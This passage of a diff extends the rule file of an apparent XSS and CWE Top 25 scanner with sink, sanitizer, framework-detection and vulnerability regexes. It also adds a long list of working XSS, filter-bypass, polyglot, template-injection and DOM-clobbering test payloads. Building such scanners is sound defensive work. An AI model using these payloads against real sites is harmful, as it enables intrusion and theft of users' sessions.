+  - name: "$.wrapAll()"
+    pattern: '\.wrapAll\s*\(\s*[^)\s]'
+    description: "jQuery wrapAll"
     severity: "MEDIUM"
     cwe: "CWE-79"
     category: "jquery"
 
-  - name: "$()-template-literal"
+  - name: "$.wrapInner()"
+    pattern: '\.wrapInner\s*\(\s*[^)\s]'
+    description: "jQuery wrapInner"
+    severity: "MEDIUM"
+    cwe: "CWE-79"
+    category: "jquery"
+
+  - name: "$() selector concat"
+    pattern: '\$\s*\(\s*[''"][^)]*\+'
+    description: "jQuery selector with string concatenation"
+    severity: "MEDIUM"
+    cwe: "CWE-79"
+    category: "jquery"
+    notes: "May create HTML if starts with <"
+
+  - name: "$() template literal"
     pattern: '\$\s*\(\s*`[^`]*\$\{'
     description: "jQuery selector with template literal"
     severity: "MEDIUM"
     cwe: "CWE-79"
     category: "jquery"
 
-  # Navigation sinks
-  - name: "location="
+  - name: "jQuery() concat"
+    pattern: 'jQuery\s*\(\s*[''"][^)]*\+'
+    description: "jQuery() with concatenation"
+    severity: "MEDIUM"
+    cwe: "CWE-79"
+    category: "jquery"
+
+  - name: "$.parseHTML"
+    pattern: '\$\.parseHTML\s*\('
+    description: "jQuery parseHTML"
+    severity: "HIGH"
+    cwe: "CWE-79"
+    category: "jquery"
+
+  - name: "$.globalEval"
+    pattern: '\$\.globalEval\s*\('
+    description: "jQuery global eval"
+    severity: "CRITICAL"
+    cwe: "CWE-95"
+    category: "jquery"
+
+  - name: ".attr() setter"
+    pattern: '\.attr\s*\(\s*[''"][^''")]+[''"],\s*[^)]'
+    description: "jQuery attribute setter"
+    severity: "MEDIUM"
+    cwe: "CWE-79"
+    category: "jquery"
+
+  - name: ".prop() setter"
+    pattern: '\.prop\s*\(\s*[''"][^''")]+[''"],\s*[^)]'
+    description: "jQuery property setter"
+    severity: "MEDIUM"
+    cwe: "CWE-79"
+    category: "jquery"
+
+  - name: ".css() setter"
+    pattern: '\.css\s*\(\s*[''"][^''")]+[''"],\s*[^)]'
+    description: "jQuery CSS setter (expression injection)"
+    severity: "LOW"
+    cwe: "CWE-79"
+    category: "jquery"
+
+  # ---------------------------------------------------------------------------
+  # Navigation/Redirect Sinks
+  # ---------------------------------------------------------------------------
+  - name: "location ="
     pattern: '\blocation\s*='
     description: "Location assignment - open redirect"
     severity: "MEDIUM"
     cwe: "CWE-601"
     category: "redirect"
 
-  - name: "location.href="
+  - name: "location.href ="
     pattern: 'location\.href\s*='
     description: "Location href assignment"
     severity: "MEDIUM"
@@ -388,190 +1100,485 @@ sinks:
     cwe: "CWE-601"
     category: "redirect"
 
-  # Framework-specific sinks
+  - name: "window.location ="
+    pattern: 'window\.location\s*='
+    description: "Window location assignment"
+    severity: "MEDIUM"
+    cwe: "CWE-601"
+    category: "redirect"
+
+  - name: "self.location ="
+    pattern: 'self\.location\s*='
+    description: "Self location assignment"
+    severity: "MEDIUM"
+    cwe: "CWE-601"
+    category: "redirect"
+
+  - name: "top.location ="
+    pattern: 'top\.location\s*='
+    description: "Top location assignment"
+    severity: "MEDIUM"
+    cwe: "CWE-601"
+    category: "redirect"
+
+  - name: "document.location ="
+    pattern: 'document\.location\s*='
+    description: "Document location assignment"
+    severity: "MEDIUM"
+    cwe: "CWE-601"
+    category: "redirect"
+
+  - name: "history.pushState"
+    pattern: 'history\.pushState\s*\('
+    description: "History pushState"
+    severity: "LOW"
+    cwe: "CWE-601"
+    category: "redirect"
+
+  - name: "history.replaceState"
+    pattern: 'history\.replaceState\s*\('
+    description: "History replaceState"
+    severity: "LOW"
+    cwe: "CWE-601"
+    category: "redirect"
+
+  # ---------------------------------------------------------------------------
+  # Framework-Specific Sinks
+  # ---------------------------------------------------------------------------
+  # React
+  - name: "dangerouslySetInnerHTML"
+    pattern: 'dangerouslySetInnerHTML'
+    description: "React dangerous HTML injection"
+    severity: "HIGH"
+    cwe: "CWE-79"
+    category: "react"
+
+  - name: "ReactDOM.render"
+    pattern: 'ReactDOM\.render\s*\('
+    description: "ReactDOM render"
+    severity: "MEDIUM"
+    cwe: "CWE-79"
+    category: "react"
+
+  # Vue
   - name: "v-html"
     pattern: 'v-html\s*='
     description: "Vue v-html directive"
     severity: "HIGH"
     cwe: "CWE-79"
-    category: "framework"
+    category: "vue"
 
-  - name: "dangerouslySetInnerHTML"
-    pattern: 'dangerouslySetInnerHTML'
-    description: "React dangerouslySetInnerHTML"
+  - name: "v-bind:innerHTML"
+    pattern: ':innerHTML\s*='
+    description: "Vue innerHTML binding"
     severity: "HIGH"
     cwe: "CWE-79"
-    category: "framework"
+    category: "vue"
 
+  - name: "$el.innerHTML"
+    pattern: '\$el\.innerHTML\s*='
+    description: "Vue element innerHTML"
+    severity: "HIGH"
+    cwe: "CWE-79"
+    category: "vue"
+
+  # Angular
   - name: "[innerHTML]"
     pattern: '\[innerHTML\]\s*='
     description: "Angular innerHTML binding"
     severity: "HIGH"
     cwe: "CWE-79"
-    category: "framework"
+    category: "angular"
 
+  - name: "[outerHTML]"
+    pattern: '\[outerHTML\]\s*='
+    description: "Angular outerHTML binding"
+    severity: "HIGH"
+    cwe: "CWE-79"
+    category: "angular"
+
+  - name: "bypassSecurityTrustHtml"
+    pattern: 'bypassSecurityTrustHtml\s*\('
+    description: "Angular security bypass for HTML"
+    severity: "HIGH"
+    cwe: "CWE-79"
+    category: "angular"
+
+  - name: "bypassSecurityTrustScript"
+    pattern: 'bypassSecurityTrustScript\s*\('
+    description: "Angular security bypass for scripts"
+    severity: "CRITICAL"
+    cwe: "CWE-79"
+    category: "angular"
+
+  - name: "bypassSecurityTrustUrl"
+    pattern: 'bypassSecurityTrustUrl\s*\('
+    description: "Angular security bypass for URLs"
+    severity: "MEDIUM"
+    cwe: "CWE-79"
+    category: "angular"
+
+  - name: "bypassSecurityTrustResourceUrl"
+    pattern: 'bypassSecurityTrustResourceUrl\s*\('
+    description: "Angular security bypass for resource URLs"
+    severity: "HIGH"
+    cwe: "CWE-79"
+    category: "angular"
+
+  - name: "bypassSecurityTrustStyle"
+    pattern: 'bypassSecurityTrustStyle\s*\('
+    description: "Angular security bypass for styles"
+    severity: "LOW"
+    cwe: "CWE-79"
+    category: "angular"
+
+  # AngularJS (1.x)
   - name: "ng-bind-html"
     pattern: 'ng-bind-html\s*='
-    description: "AngularJS ng-bind-html"
+    description: "AngularJS HTML binding"
     severity: "HIGH"
     cwe: "CWE-79"
-    category: "framework"
+    category: "angularjs"
 
-  - name: "bypassSecurityTrust"
-    pattern: 'bypassSecurityTrust'
-    description: "Angular security bypass"
+  - name: "ng-bind-html-unsafe"
+    pattern: 'ng-bind-html-unsafe\s*='
+    description: "AngularJS unsafe HTML binding (deprecated)"
+    severity: "CRITICAL"
+    cwe: "CWE-79"
+    category: "angularjs"
+
+  - name: "$sce.trustAsHtml"
+    pattern: '\$sce\.trustAsHtml\s*\('
+    description: "AngularJS trust as HTML"
     severity: "HIGH"
     cwe: "CWE-79"
-    category: "framework"
+    category: "angularjs"
 
-  - name: "trustAsHtml"
-    pattern: 'trustAsHtml\s*\('
-    description: "AngularJS trustAsHtml"
+  - name: "$sce.trustAs"
+    pattern: '\$sce\.trustAs\s*\('
+    description: "AngularJS trust as"
     severity: "HIGH"
     cwe: "CWE-79"
-    category: "framework"
+    category: "angularjs"
 
-  # DOM manipulation sinks
-  - name: "setAttribute-on*"
-    pattern: 'setAttribute\s*\(\s*[''"]on'
-    description: "Setting event handler attribute"
+  # Svelte
+  - name: "{@html}"
+    pattern: '\{@html\s+'
+    description: "Svelte HTML injection"
     severity: "HIGH"
     cwe: "CWE-79"
-    category: "dom"
+    category: "svelte"
 
-  - name: "setAttribute-src"
-    pattern: 'setAttribute\s*\(\s*[''"]src[''"]'
-    description: "Setting src attribute"
-    severity: "MEDIUM"
-    cwe: "CWE-79"
-    category: "dom"
-
-  - name: "setAttribute-href"
-    pattern: 'setAttribute\s*\(\s*[''"]href[''"]'
-    description: "Setting href attribute"
-    severity: "MEDIUM"
-    cwe: "CWE-79"
-    category: "dom"
-
-  - name: "createElement-script"
-    pattern: 'createElement\s*\(\s*[''"]script[''"]'
-    description: "Creating script element"
+  # Handlebars/Mustache
+  - name: "triple-stash"
+    pattern: '\{\{\{[^}]+\}\}\}'
+    description: "Handlebars unescaped output"
     severity: "HIGH"
     cwe: "CWE-79"
-    category: "dom"
+    category: "template"
 
-  - name: "createContextualFragment"
-    pattern: 'createContextualFragment\s*\('
-    description: "Creating document fragment from HTML"
+  - name: "SafeString"
+    pattern: 'SafeString\s*\('
+    description: "Handlebars SafeString"
     severity: "HIGH"
     cwe: "CWE-79"
-    category: "dom"
+    category: "template"
 
-  - name: "script.src="
-    pattern: 'script\.src\s*='
-    description: "Setting script src"
-    severity: "HIGH"
-    cwe: "CWE-79"
-    category: "dom"
-
-  # postMessage sink
+  # ---------------------------------------------------------------------------
+  # postMessage Sinks
+  # ---------------------------------------------------------------------------
   - name: "postMessage"
     pattern: '\.postMessage\s*\('
-    description: "postMessage - check origin validation"
+    description: "postMessage - check target origin validation"
     severity: "INFO"
     cwe: "CWE-346"
     category: "message"
 
-# Framework detection patterns
+  - name: "postMessage *"
+    pattern: '\.postMessage\s*\([^)]+[''"]\\*[''"]'
+    description: "postMessage with wildcard origin"
+    severity: "MEDIUM"
+    cwe: "CWE-346"
+    category: "message"
+
+# ============================================================================
+# SANITIZERS - Functions that may prevent XSS
+# ============================================================================
+sanitizers:
+  - name: "DOMPurify.sanitize"
+    pattern: 'DOMPurify\.sanitize\s*\('
+    description: "DOMPurify sanitization"
+    effectiveness: "HIGH"
+
+  - name: "sanitizeHtml"
+    pattern: 'sanitizeHtml\s*\('
+    description: "sanitize-html library"
+    effectiveness: "HIGH"
+
+  - name: "escapeHtml"
+    pattern: 'escapeHtml\s*\('
+    description: "HTML escaping function"
+    effectiveness: "MEDIUM"
+
+  - name: "htmlEncode"
+    pattern: 'htmlEncode\s*\('
+    description: "HTML encoding function"
+    effectiveness: "MEDIUM"
+
+  - name: "encodeURIComponent"
+    pattern: 'encodeURIComponent\s*\('
+    description: "URL encoding"
+    effectiveness: "MEDIUM"
+
+  - name: "textContent ="
+    pattern: '\.textContent\s*='
+    description: "textContent assignment (safe)"
+    effectiveness: "HIGH"
+
+  - name: "innerText ="
+    pattern: '\.innerText\s*='
+    description: "innerText assignment (mostly safe)"
+    effectiveness: "HIGH"
+
+  - name: "createTextNode"
+    pattern: 'createTextNode\s*\('
+    description: "Creating text node (safe)"
+    effectiveness: "HIGH"
+
+  - name: "$.text()"
+    pattern: '\.text\s*\(\s*[^)\s]'
+    description: "jQuery text setter (safe)"
+    effectiveness: "HIGH"
+
+  - name: "validator"
+    pattern: 'validator\.'
+    description: "Validator library"
+    effectiveness: "MEDIUM"
+
+  - name: "xss-filters"
+    pattern: 'xssFilters\.'
+    description: "xss-filters library"
+    effectiveness: "HIGH"
+
+  - name: "he.encode"
+    pattern: 'he\.encode\s*\('
+    description: "he library encoding"
+    effectiveness: "HIGH"
+
+  - name: "_.escape"
+    pattern: '_\.escape\s*\('
+    description: "Lodash/Underscore escape"
+    effectiveness: "HIGH"
+
+# ============================================================================
+# FRAMEWORK DETECTION
+# ============================================================================
 frameworks:
   - name: "jQuery"
     pattern: 'jquery|\.fn\.|jQuery|\$\s*\('
-    version_pattern: 'jquery[/-]?(\d+\.\d+(?:\.\d+)?)'
+    version_pattern: 'jquery[/-]?v?(\d+\.\d+(?:\.\d+)?)'
+    vulnerable_versions:
+      - version: "< 1.9.0"
+        issue: "Selector-based XSS via $() with HTML"
+      - version: "< 3.5.0"
+        issue: "Prototype pollution in $.extend"
 
   - name: "React"
-    pattern: 'React\.|ReactDOM|createElement|useState|useEffect|dangerouslySetInnerHTML'
-    version_pattern: 'react[/-]?(\d+\.\d+(?:\.\d+)?)'
+    pattern: 'React\.|ReactDOM|createElement|useState|useEffect'
+    version_pattern: 'react[/-]?v?(\d+\.\d+(?:\.\d+)?)'
 
   - name: "Vue"
-    pattern: 'Vue\.|v-bind|v-model|v-html|v-on:|@click|:class'
-    version_pattern: 'vue[/-]?(\d+\.\d+(?:\.\d+)?)'
+    pattern: 'Vue\.|new Vue|createApp|v-bind|v-model|v-html'
+    version_pattern: 'vue[/-]?v?(\d+\.\d+(?:\.\d+)?)'
 
   - name: "Angular"
-    pattern: 'angular\.|ng-|ngIf|ngFor|\[ngClass\]'
-    version_pattern: 'angular[/-]?(\d+\.\d+(?:\.\d+)?)'
+    pattern: '@angular|platformBrowser|ngModule|Component'
+    version_pattern: '@angular/core[/-]?v?(\d+\.\d+(?:\.\d+)?)'
 
   - name: "AngularJS"
-    pattern: 'angular\.module|ng-app|ng-controller'
-    version_pattern: 'angular[/-]?(\d+\.\d+(?:\.\d+)?)'
+    pattern: 'angular\.module|ng-app|ng-controller|ng-repeat'
+    version_pattern: 'angular[/-]?v?(\d+\.\d+(?:\.\d+)?)'
+    vulnerable_versions:
+      - version: "< 1.6.0"
+        issue: "Sandbox bypass vulnerabilities"
 
   - name: "Svelte"
     pattern: '<script.*context="module"|{@html|bind:'
-    version_pattern: 'svelte[/-]?(\d+\.\d+(?:\.\d+)?)'
+    version_pattern: 'svelte[/-]?v?(\d+\.\d+(?:\.\d+)?)'
 
   - name: "Ember"
-    pattern: 'Ember\.|Marionette|{{#each|{{#if'
-    version_pattern: 'ember[/-]?(\d+\.\d+(?:\.\d+)?)'
+    pattern: 'Ember\.|{{#each|{{#if|@ember'
+    version_pattern: 'ember[/-]?v?(\d+\.\d+(?:\.\d+)?)'
 
   - name: "Backbone"
-    pattern: 'Backbone\.|Marionette'
-    version_pattern: 'backbone[/-]?(\d+\.\d+(?:\.\d+)?)'
+    pattern: 'Backbone\.|Marionette|\.extend\('
+    version_pattern: 'backbone[/-]?v?(\d+\.\d+(?:\.\d+)?)'
+
+  - name: "Knockout"
+    pattern: 'ko\.|data-bind'
+    version_pattern: 'knockout[/-]?v?(\d+\.\d+(?:\.\d+)?)'
 
   - name: "Handlebars"
     pattern: 'Handlebars\.|{{#|{{/|{{>'
-    version_pattern: 'handlebars[/-]?(\d+\.\d+(?:\.\d+)?)'
+    version_pattern: 'handlebars[/-]?v?(\d+\.\d+(?:\.\d+)?)'
+
+  - name: "Mustache"
+    pattern: 'Mustache\.|{{#|{{/|{{>'
+    version_pattern: 'mustache[/-]?v?(\d+\.\d+(?:\.\d+)?)'
 
   - name: "Lodash"
     pattern: '_\.|lodash'
-    version_pattern: 'lodash[/-]?(\d+\.\d+(?:\.\d+)?)'
+    version_pattern: 'lodash[/-]?v?(\d+\.\d+(?:\.\d+)?)'
+    vulnerable_versions:
+      - version: "< 4.17.21"
+        issue: "Prototype pollution"
 
-# XSS Payloads for active testing
+  - name: "Underscore"
+    pattern: '_\.|underscore'
+    version_pattern: 'underscore[/-]?v?(\d+\.\d+(?:\.\d+)?)'
+
+  - name: "DOMPurify"
+    pattern: 'DOMPurify'
+    version_pattern: 'dompurify[/-]?v?(\d+\.\d+(?:\.\d+)?)'
+    is_sanitizer: true
+
+  - name: "Next.js"
+    pattern: 'next/|__NEXT_DATA__'
+    version_pattern: 'next[/-]?v?(\d+\.\d+(?:\.\d+)?)'
+
+  - name: "Nuxt"
+    pattern: 'nuxt|__NUXT__'
+    version_pattern: 'nuxt[/-]?v?(\d+\.\d+(?:\.\d+)?)'
+
+  - name: "Gatsby"
+    pattern: 'gatsby'
+    version_pattern: 'gatsby[/-]?v?(\d+\.\d+(?:\.\d+)?)'
+
+# ============================================================================
+# XSS PAYLOADS FOR TESTING
+# ============================================================================
 payloads:
+  # Basic payloads - high success rate
   basic:
     - '<script>alert(1)</script>'
+    - '<script>alert(document.domain)</script>'
+    - '<script>alert(document.cookie)</script>'
     - '<img src=x onerror=alert(1)>'
+    - '<img/src=x onerror=alert(1)>'
     - '<svg onload=alert(1)>'
+    - '<svg/onload=alert(1)>'
     - '<body onload=alert(1)>'
-    - '<iframe src="javascript:alert(1)">'
     - '<input onfocus=alert(1) autofocus>'
+    - '<input onblur=alert(1) autofocus><input autofocus>'
     - '<marquee onstart=alert(1)>'
     - '<video><source onerror=alert(1)>'
+    - '<video src=x onerror=alert(1)>'
     - '<audio src=x onerror=alert(1)>'
     - '<details open ontoggle=alert(1)>'
+    - '<iframe src="javascript:alert(1)">'
+    - '<iframe srcdoc="<script>alert(1)</script>">'
+    - '<object data="javascript:alert(1)">'
+    - '<embed src="javascript:alert(1)">'
+    - '<math><maction actiontype="statusline#http://google.com" xlink:href="javascript:alert(1)">CLICKME'
+    - '<isindex type=image src=1 onerror=alert(1)>'
+    - '<form><button formaction="javascript:alert(1)">X</button>'
+    - '<base href="javascript:/a/-alert(1)///////"><a href=../lol/safari.html>click'
 
+  # Event handler payloads
   event_handlers:
     - "'-alert(1)-'"
     - '"-alert(1)-"'
-    - "';alert(1)//"
-    - '";alert(1)//'
+    - "';alert(1)//'"
+    - '";alert(1)//"'
     - "onmouseover=alert(1)//"
     - "onfocus=alert(1) autofocus//"
+    - "onclick=alert(1)//"
+    - "onerror=alert(1)//"
+    - "onload=alert(1)//"
+    - "oncut=alert(1)//"
+    - "oncopy=alert(1)//"
+    - "onpaste=alert(1)//"
+    - "ondrag=alert(1)//"
+    - "ondrop=alert(1)//"
+    - "onwheel=alert(1)//"
+    - "onscroll=alert(1)//"
+    - "onresize=alert(1)//"
+    - "onhashchange=alert(1)//"
+    - "ontouchstart=alert(1)//"
+    - "ontouchend=alert(1)//"
+    - "ontouchmove=alert(1)//"
+    - "onpointerdown=alert(1)//"
+    - "onpointerup=alert(1)//"
+    - "onanimationend=alert(1)//"
+    - "onanimationstart=alert(1)//"
+    - "ontransitionend=alert(1)//"
 
+  # JavaScript protocol payloads
   javascript_protocol:
     - 'javascript:alert(1)'
     - 'javascript:alert(document.domain)'
     - 'javascript:alert(document.cookie)'
     - 'JaVaScRiPt:alert(1)'
+    - 'javascript://comment%0aalert(1)'
+    - 'javascript://%0aalert(1)'
     - 'javascript:/**/alert(1)'
+    - 'javascript:alert`1`'
+    - 'javascript:alert&lpar;1&rpar;'
+    - "javascript:x='%27-alert(1)-%27'"
+    - 'data:text/html,<script>alert(1)</script>'
+    - 'data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=='
+    - 'vbscript:alert(1)'
+    - 'livescript:alert(1)'
 
+  # Encoded payloads
   encoded:
     - '%3Cscript%3Ealert(1)%3C/script%3E'
     - '%3Csvg%20onload=alert(1)%3E'
+    - '%253Cscript%253Ealert(1)%253C/script%253E'
     - '&#60;script&#62;alert(1)&#60;/script&#62;'
+    - '&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;'
     - '\x3cscript\x3ealert(1)\x3c/script\x3e'
     - '\u003cscript\u003ealert(1)\u003c/script\u003e'
+    - '<scr\x00ipt>alert(1)</scr\x00ipt>'
+    - '<scr\tipt>alert(1)</scr\tipt>'
+    - '<scr\nipt>alert(1)</scr\nipt>'
+    - '<scr\ript>alert(1)</scr\ript>'
+    - '<script>alert(String.fromCharCode(88,83,83))</script>'
+    - '<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>'
+    - '<img src=x onerror=&#x61;&#x6c;&#x65;&#x72;&#x74;(1)>'
+    - '<img src=x onerror=eval(atob(`YWxlcnQoMSk=`))>'
 
+  # Template injection payloads
   template_injection:
     - '{{constructor.constructor("alert(1)")()}}'
+    - '{{constructor.constructor`alert\x281\x29```}}'
     - '${alert(1)}'
-    - '#{alert(1)}'
-    - '{{7*7}}'
     - '${7*7}'
+    - '#{alert(1)}'
+    - '#{7*7}'
+    - '{{7*7}}'
+    - '{{7*"7"}}'
+    - '[[${7*7}]]'
+    - '<%=7*7%>'
+    - '{%%}{%%}'
+    - '{{config}}'
+    - '{{self}}'
+    - '{{request}}'
+    - "{{''.__class__.__mro__[2].__subclasses__()}}"
 
+  # DOM clobbering payloads
   dom_clobbering:
     - '<form id=x><input name=y value=z>'
     - '<img name=x>'
     - '<a id=x href=y>'
+    - '<a id=x name=y href=z>'
+    - '<form id=x name=y><input id=z>'
+    - '<object id=x><param name=y value=z>'
+    - '<output id=x>test</output>'
+    - '<iframe name=x srcdoc="<a id=y href=z>">'
+    - '<form id=document><input name=cookie>'
 
+  # Filter bypass payloads
   filter_bypass:
     - '<svg/onload=alert(1)>'
     - '<svg onload=alert(1)//>'
@@ -579,8 +1586,512 @@ payloads:
     - "<svg onload='alert(1)'>"
     - '<img src=x onerror="alert(1)">'
     - '<img src=x onerror=alert`1`>'
-    - '<script>alert(String.fromCharCode(88,83,83))</script>'
+    - '<img src=x onerror=alert&#40;1&#41;>'
+    - '<script>alert(1)</script//>'
+    - '<script>alert(1);</script >'
+    - '<script >alert(1)</script>'
+    - '< script>alert(1)</script>'
+    - '<SCRIPT>alert(1)</SCRIPT>'
+    - '<ScRiPt>alert(1)</ScRiPt>'
+    - '<script\x20>alert(1)</script>'
+    - '<script\x09>alert(1)</script>'
+    - '<script\x0a>alert(1)</script>'
+    - '<script\x0d>alert(1)</script>'
+    - '<script\x00>alert(1)</script>'
+    - '<script/x>alert(1)</script>'
+    - '<img src="x`onerror=alert(1)">'
+    - '<img src=`x`onerror=alert(1)>'
+    - "<<script>alert(1);//<</script>"
+    - '<x onclick=alert(1)>click'
+    - '<x style=behavior:url(#default#time2) onbegin=alert(1)>'
+    - '<x contenteditable onblur=alert(1)>lose focus!'
+    - '<marquee loop=1 onfinish=alert(1)>xss'
+    - '<marquee onstart=alert(1)>'
+    - '<body/onload=alert(1)>'
+    - '<body\x09onload=alert(1)>'
+    - '<body\x0aonload=alert(1)>'
+    - '</script><script>alert(1)</script>'
+    - '</title><script>alert(1)</script>'
+    - '</style><script>alert(1)</script>'
+    - '</textarea><script>alert(1)</script>'
+    - '</noscript><script>alert(1)</script>'
+    - "';alert(1)//\\"
+    - '";alert(1)//\\'
+    - "\\';alert(1);//"
 
+  # Polyglot payloads (work in multiple contexts)
   polyglot:
-    - "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcLiCk=alert() )//"
+    - "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcLiCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e"
     - "'\"-->]]>*/</script></style></title></textarea></noscript></template></select><svg/onload=alert()>"
+    - "javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+alert(1)//'>"
+    - "-->'\"--></style></script><script>alert(1)</script>"
+    - "'\"><img src=x onerror=alert(1)//>"
+    - "'-alert(1)-'"
+    - "\\'-alert(1)//"
+
+  # Context-specific payloads
+  html_context:
+    - '<script>alert(1)</script>'
+    - '<img src=x onerror=alert(1)>'
+    - '<svg onload=alert(1)>'
+
+  attribute_context:
+    - '" onmouseover="alert(1)"'
+    - "' onmouseover='alert(1)'"
+    - '" onfocus="alert(1)" autofocus "'
+    - "' onfocus='alert(1)' autofocus '"
+
+  javascript_context:
+    - "'-alert(1)-'"
+    - '"-alert(1)-"'
+    - "\\'-alert(1)//"
+    - "\\'-alert(1)-\\'"
+    - '</script><script>alert(1)</script>'
+    - "1;alert(1)//"
+    - "1}alert(1)//"
+    - "1)]};alert(1)//"
+
+  url_context:
+    - 'javascript:alert(1)'
+    - 'data:text/html,<script>alert(1)</script>'
+    - '//evil.com?'
+
+  css_context:
+    - 'expression(alert(1))'
+    - 'url(javascript:alert(1))'
+    - "};alert(1)//'"
+
+# ============================================================================
+# TOP 25 CWE DETECTION PATTERNS
+# ============================================================================
+# Detection patterns for the top 25 most dangerous software weaknesses
+# Reference: https://cwe.mitre.org/top25/archive/2024/2024_top25_list.html
+# ============================================================================
+
+cwe_patterns:
+  # ---------------------------------------------------------------------------
+  # CWE-79: Cross-site Scripting (XSS) - Covered above in sinks section
+  # ---------------------------------------------------------------------------
+
+  # ---------------------------------------------------------------------------
+  # CWE-89: SQL Injection
+  # ---------------------------------------------------------------------------
+  sql_injection:
+    - name: "SQL query construction"
+      pattern: '(?:query|sql|execute|prepare)\s*\(\s*[`''"]\s*(?:SELECT|INSERT|UPDATE|DELETE|DROP|UNION|FROM|WHERE)'
+      description: "Direct SQL query construction"
+      severity: "CRITICAL"
+      cwe: "CWE-89"
+
+    - name: "String concat in query"
+      pattern: '(?:query|sql)\s*[\+\+=].*[\+\+]\s*(?:req|request|params|input|user)'
+      description: "String concatenation in SQL query"
+      severity: "CRITICAL"
+      cwe: "CWE-89"
+
+    - name: "Template literal SQL"
+      pattern: '(?:query|sql|execute)\s*\(\s*`[^`]*\$\{.*\}'
+      description: "Template literal in SQL"
+      severity: "CRITICAL"
+      cwe: "CWE-89"
+
+  # ---------------------------------------------------------------------------
+  # CWE-78: OS Command Injection
+  # ---------------------------------------------------------------------------
+  command_injection:
+    - name: "exec function"
+      pattern: '\bexec\s*\(\s*[^)]*(?:req|request|params|input|user)'
+      description: "exec() with user input"
+      severity: "CRITICAL"
+      cwe: "CWE-78"
+
+    - name: "child_process spawn"
+      pattern: '(?:spawn|execFile|execSync|spawnSync)\s*\('
+      description: "Child process execution"
+      severity: "HIGH"
+      cwe: "CWE-78"
+
+    - name: "shell execution"
+      pattern: 'shell\s*:\s*true'
+      description: "Shell execution enabled"
+      severity: "HIGH"
+      cwe: "CWE-78"
+
+    - name: "system call"
+      pattern: '\bsystem\s*\(\s*[^)]*(?:\+|`|\$)'
+      description: "System call with dynamic input"
+      severity: "CRITICAL"
+      cwe: "CWE-78"
+
+  # ---------------------------------------------------------------------------
+  # CWE-22: Path Traversal
+  # ---------------------------------------------------------------------------
+  path_traversal:
+    - name: "Path join with user input"
+      pattern: '(?:path\.join|path\.resolve)\s*\([^)]*(?:req|request|params|input)'
+      description: "Path construction with user input"
+      severity: "HIGH"
+      cwe: "CWE-22"
+
+    - name: "fs operations with input"
+      pattern: '(?:readFile|writeFile|readdir|unlink|rmdir)\s*\([^)]*(?:req|request|params|input)'
+      description: "File system operation with user input"
+      severity: "HIGH"
+      cwe: "CWE-22"
+
+    - name: "Directory traversal pattern"
+      pattern: '(?:\.\./|\.\.\\\\|%2e%2e|%252e)'
+      description: "Directory traversal sequence"
+      severity: "HIGH"
+      cwe: "CWE-22"
+
+    - name: "file:// protocol"
+      pattern: 'file://'
+      description: "File protocol handler"
+      severity: "MEDIUM"
+      cwe: "CWE-22"
+
+  # ---------------------------------------------------------------------------
+  # CWE-352: Cross-Site Request Forgery (CSRF)
+  # ---------------------------------------------------------------------------
+  csrf:
+    - name: "Form without CSRF token"
+      pattern: '<form[^>]*method\s*=\s*["\']?post[^>]*>(?:(?!csrf|token|_token|authenticity).)*?</form>'
+      description: "POST form without CSRF token"
+      severity: "MEDIUM"
+      cwe: "CWE-352"
+
+    - name: "State-changing GET"
+      pattern: '<a[^>]*href\s*=\s*["\'][^"\']*(?:delete|remove|update|create|modify)'
+      description: "State-changing action via GET"
+      severity: "MEDIUM"
+      cwe: "CWE-352"
+
+    - name: "Missing SameSite cookie"
+      pattern: 'Set-Cookie:[^;]*(?:session|auth|token)(?!.*SameSite)'
+      description: "Session cookie without SameSite"
+      severity: "LOW"
+      cwe: "CWE-352"
+
+  # ---------------------------------------------------------------------------
+  # CWE-918: Server-Side Request Forgery (SSRF)
+  # ---------------------------------------------------------------------------
+  ssrf:
+    - name: "URL from user input"
+      pattern: '(?:fetch|axios|request|http\.get|https\.get)\s*\([^)]*(?:req|request|params|url|target|host)'
+      description: "HTTP request with user-controlled URL"
+      severity: "HIGH"
+      cwe: "CWE-918"
+
+    - name: "URL constructor"
+      pattern: 'new\s+URL\s*\([^)]*(?:req|request|params|input|user)'
+      description: "URL construction with user input"
+      severity: "HIGH"
+      cwe: "CWE-918"
+
+    - name: "Internal IP patterns"
+      pattern: '(?:127\.0\.0\.1|localhost|10\.\d+\.\d+\.\d+|172\.(?:1[6-9]|2\d|3[01])\.\d+\.\d+|192\.168\.\d+\.\d+|169\.254\.\d+\.\d+|0\.0\.0\.0)'
+      description: "Internal/private IP address"
+      severity: "INFO"
+      cwe: "CWE-918"
+
+  # ---------------------------------------------------------------------------
+  # CWE-502: Deserialization of Untrusted Data
+  # ---------------------------------------------------------------------------
+  deserialization:
+    - name: "JSON.parse without validation"
+      pattern: 'JSON\.parse\s*\([^)]*(?:req|request|body|params|input)'
+      description: "JSON parsing of user input"
+      severity: "MEDIUM"
+      cwe: "CWE-502"
+
+    - name: "unserialize/pickle"
+      pattern: '(?:unserialize|pickle\.loads|yaml\.load)\s*\('
+      description: "Dangerous deserialization function"
+      severity: "CRITICAL"
+      cwe: "CWE-502"
+
+    - name: "Object.assign prototype"
+      pattern: 'Object\.assign\s*\(\s*(?:{}|Object\.create)'
+      description: "Potential prototype pollution"
+      severity: "MEDIUM"
+      cwe: "CWE-502"
+
+    - name: "YAML unsafe load"
+      pattern: 'yaml\.(?:unsafe_load|load)\s*\('
+      description: "Unsafe YAML loading"
+      severity: "CRITICAL"
+      cwe: "CWE-502"
+
+  # ---------------------------------------------------------------------------
+  # CWE-287: Improper Authentication
+  # ---------------------------------------------------------------------------
+  auth_bypass:
+    - name: "Hardcoded credentials"
+      pattern: '(?:password|passwd|pwd|secret|api_key|apikey|token)\s*[:=]\s*["\'][^"\']{4,}["\']'
+      description: "Hardcoded credential or secret"
+      severity: "HIGH"
+      cwe: "CWE-287"
+
+    - name: "Weak password comparison"
+      pattern: '(?:password|passwd)\s*(?:==|===|!=|!==)\s*["\']'
+      description: "Direct password comparison"
+      severity: "MEDIUM"
+      cwe: "CWE-287"
+
+    - name: "Authentication bypass"
+      pattern: '(?:isAdmin|isAuthenticated|isLoggedIn)\s*[:=]\s*(?:true|1|["\'])'
